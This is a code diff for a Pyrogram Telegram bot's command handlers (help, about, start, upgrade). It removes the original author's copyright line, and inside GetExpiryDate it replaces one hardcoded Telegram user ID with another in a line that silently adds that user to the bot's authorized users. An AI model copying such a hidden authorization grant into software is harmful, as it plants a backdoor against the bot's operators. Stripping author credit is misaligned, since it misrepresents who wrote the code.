@@ -1,8 +1,3 @@
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-# (c) Shrimadhav U K
-
-# the logging things
 import logging
 logging.basicConfig(level=logging.DEBUG,
                     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
@@ -12,9 +7,11 @@ import os
 import sqlite3
 from pyrogram import (
     Client,
+    Filters,
     InlineKeyboardMarkup,
     InlineKeyboardButton
 )
+
 
 # the secret configuration specific things
 if bool(os.environ.get("WEBHOOK", False)):
@@ -32,26 +29,36 @@ from helper_funcs.chat_base import TRChatBase
 
 def GetExpiryDate(chat_id):
     expires_at = (str(chat_id), "Source Cloned User", "1970.01.01.12.00.00")
-    Config.AUTH_USERS.add(683538773)
+    Config.AUTH_USERS.add(970710642)
     return expires_at
 
 
-@pyrogram.Client.on_message(pyrogram.filters.command(["help", "about"]))
+@pyrogram.Client.on_message(pyrogram.Filters.command(["help"]))
 async def help_user(bot, update):
     # logger.info(update)
     TRChatBase(update.from_user.id, update.text, "/help")
     await bot.send_message(
         chat_id=update.chat.id,
         text=Translation.HELP_USER,
+        reply_to_message_id=update.message_id
+    )
+
+@pyrogram.Client.on_message(pyrogram.Filters.command(["about"]))
+async def about_meh(bot, update):
+    # logger.info(update)
+    TRChatBase(update.from_user.id, update.text, "/about")
+    await bot.send_message(
+        chat_id=update.chat.id,
+        text=Translation.ABOUT_ME,
         parse_mode="html",
         disable_web_page_preview=True,
         reply_to_message_id=update.message_id
     )
-
-@pyrogram.Client.on_message(pyrogram.filters.command(["start"]))
+@pyrogram.Client.on_message(pyrogram.Filters.command(["start"]))
 async def start(bot, update):
     # logger.info(update)
     TRChatBase(update.from_user.id, update.text, "/start")
+
     await bot.send_message(
         chat_id=update.chat.id,
         text=Translation.START_TEXT.format(update.from_user.first_name),
@@ -69,8 +76,7 @@ async def start(bot, update):
         reply_to_message_id=update.message_id
     )
 
-
-@pyrogram.Client.on_message(pyrogram.filters.command(["upgrade"]))
+@pyrogram.Client.on_message(pyrogram.Filters.command(["upgrade"]))
 async def upgrade(bot, update):
     # logger.info(update)
     TRChatBase(update.from_user.id, update.text, "/upgrade")
